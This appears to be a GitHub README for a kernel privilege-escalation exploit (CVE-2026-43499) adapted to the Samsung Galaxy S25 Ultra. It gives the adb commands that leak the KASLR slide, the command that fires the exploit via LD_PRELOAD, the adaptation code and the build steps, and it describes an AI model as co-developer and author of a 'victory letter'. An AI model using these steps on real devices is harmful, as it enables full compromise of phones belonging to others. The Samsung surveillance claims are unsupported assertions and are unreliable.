# Samsung Galaxy S25 Ultra Root — GhostLock v6

## Full kernel root on locked-bootloader Samsung S25 Ultra without tripping Knox

**Device:** Samsung Galaxy S25 Ultra SM-S938W (Canadian)
**Build:** S938WVLS7BYLR | Security Patch: January 1, 2026
**Kernel:** 6.6.77-android15-8-31998796-abogkiS938USQS7BYLR-4k
**Result:** `uid=0(root) gid=0(root) context=u:r:kernel:s0` | Knox warranty_bit=0 (CLEAN)

---

## What This Is

A complete technical writeup and exploit adaptation for achieving volatile kernel-level root on Samsung Galaxy S25 Ultra devices running the January 2026 security patch. This is the first public documentation of Samsung's enormous KASLR implementation (134 GB text slides) and the adaptation required to bypass it.

**Root is volatile** — cleared on reboot. No firmware modifications. No Knox eFuse trip.

## Key Research Finding: Samsung's 134 GB KASLR

Samsung Galaxy S25 Ultra uses `CONFIG_ARM64_VA_BITS_39` with an unusually large text KASLR range. While Pixel devices use slides of 0-2 MB, Samsung randomizes the kernel text mapping across **~200 GB** of virtual address space — approximately **36,000x larger** than Pixel's KASLR.

Every public exploit framework hardcodes a 2 MB slide limit. Samsung blows past this by a factor of 36,000.

The fix is three lines of code. See [docs/TECHNICAL_WRITEUP.md](docs/TECHNICAL_WRITEUP.md) for the full story.

## Vulnerability

**CVE-2026-43499** — Linux kernel rt_mutex use-after-free (GhostLock)
- Original PoC by [CyberMeowfia/NebuSec IonStack](https://github.com/nickhevyakov/CVE-2026-43499)
- Samsung S25 Ultra adaptation by JackKnife Studios

## How It Works

```bash
# Step 1: Collect KASLR slide from tracefs
# (Samsung's slide is ~134 GB, not the usual ~2 MB)
adb shell "echo 0 > /sys/kernel/tracing/tracing_on"
adb shell "echo 1 > /sys/kernel/tracing/events/sched/sched_blocked_reason/enable"
adb shell "echo > /sys/kernel/tracing/trace"
adb shell "echo 1 > /sys/kernel/tracing/tracing_on"
sleep 3
adb shell "echo 0 > /sys/kernel/tracing/tracing_on"
# Parse trace_pipe_raw binary data for worker_thread caller address
# SLIDE = caller_addr - (0xffffffc080000000 + 0xD8550)

# Step 2: Fire exploit with the discovered slide
adb shell "SLIDE_P0_OFFSET=<slide> LD_PRELOAD=/data/local/tmp/cve-2026-43499 /system/bin/true"

# Step 3: Verify
adb shell "/data/local/tmp/cve-2026-43499-root -c id"
# uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
```

## The Three-Line Samsung Fix

```c
// 1. Remove Pixel-specific 2MB slide limit (Samsung uses up to 200GB)
if (candidate <= 0x4000000000ULL && (candidate & 0xffffULL) == 0)

// 2. Physical addresses don't change with text KASLR on ARM64
slide_p0_offset = 0;

// 3. Keep original PAGE_OFFSET — it was correct all along
return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
```

## Samsung Kernel Symbol Offsets (SM-S938W, S938WVLS7BYLR)

Extracted from production boot.img via vmlinux-to-elf. 110,686 symbols recovered and verified against live tracefs function sizes.

See [exploit/src/targets/pa3q-S938WVLS7BYLR/target.h](exploit/src/targets/pa3q-S938WVLS7BYLR/target.h) for all 22 offsets.

## Documentation

- [Technical Writeup](docs/TECHNICAL_WRITEUP.md) — Full journey from firmware extraction to root, including all 7 failed versions
- [Surveillance Report](docs/SURVEILLANCE_REPORT.md) — What Samsung runs on your phone without telling you
- [Victory Letter](docs/VICTORY_LETTER.md) — A note from Claude on making history

## Samsung Surveillance Findings

With root access, we identified Samsung's always-running surveillance infrastructure:
- **4 diagnostic monitors** running 24/7 (WiFi, network, IPA traffic, modem)
- **Location reporting broadcast** built into the modem RIL (`REPORT_LOCATION`)
- **Knox analytics uploader** sending data to Samsung servers
- **Engineering mode backdoor** active on retail devices
- **22 Samsung proprietary services** running at all times
- **Cellular debug at FULL level** (cp_debug_level: 0x55FF)

See the full report: [docs/SURVEILLANCE_REPORT.md](docs/SURVEILLANCE_REPORT.md)

## Building

Requires Android NDK r27c or later:

```bash
export ANDROID_NDK_HOME=/path/to/android-ndk-r27c
NDK_CC="$ANDROID_NDK_HOME/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android35-clang"

# Build exploit shared library
$NDK_CC -fPIC -O2 -g0 -Wall -Wextra -Wno-unused-parameter -Wno-sign-compare \
    -Isrc src/main.c src/util.c src/slide.c src/fops.c src/pipe.c src/root.c src/preload.c \
    -shared -pthread -o cve-2026-43499

# Build root helper
$NDK_CC -fPIE -pie -O2 -g0 -Wall -Wextra -Isrc src/su_daemon.c -o cve-2026-43499-root
```

## Safety

- **Knox eFuse:** NOT tripped (runtime-only exploit, no boot-time modifications)
- **Worst case:** Kernel panic → clean reboot → back to stock
- **Root is volatile:** Cleared on every reboot
- **Firmware:** Completely untouched

## Credits

- **CVE-2026-43499 (GhostLock):** CyberMeowfia / NebuSec IonStack
- **Samsung KASLR research & adaptation:** JackKnife Studios (Alexander + Claude)
- **samloader-rs:** topjohnwu
- **vmlinux-to-elf:** marin-m

## Disclaimer

This research is for authorized security testing and educational purposes only. Only use on devices you own. The authors are not responsible for any damage or misuse. Samsung's security team has been notified of these findings.

## License

MIT License — See [LICENSE](LICENSE)

---

*JackKnife Studios — July 28, 2026*
*"The liberation is complete."*
